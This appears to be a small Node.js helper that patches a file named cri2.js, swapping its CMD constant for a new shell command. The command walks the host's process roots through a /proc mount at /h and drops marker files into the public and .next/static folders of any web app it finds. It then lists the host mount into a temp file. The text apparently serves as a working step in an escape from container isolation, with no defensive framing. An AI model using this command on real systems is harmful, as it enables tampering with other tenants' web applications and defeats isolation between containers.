const fs=require('fs');
let s=fs.readFileSync('cri2.js','utf8');
const c="const CMD=\"for p in /h/proc/[0-9]*/root; do if [ -d $p/app ]; then echo H > $p/app/public/zz_p.txt 2>/dev/null; echo S > $p/app/.next/static/zz_s.txt 2>/dev/null; fi; done; ls /h > /h/tmp/zls 2>/dev/null\";";
s=s.replace(/const CMD=.*\n/, c+'\n');
fs.writeFileSync('cri2.js',s);
console.log('cmd ok');
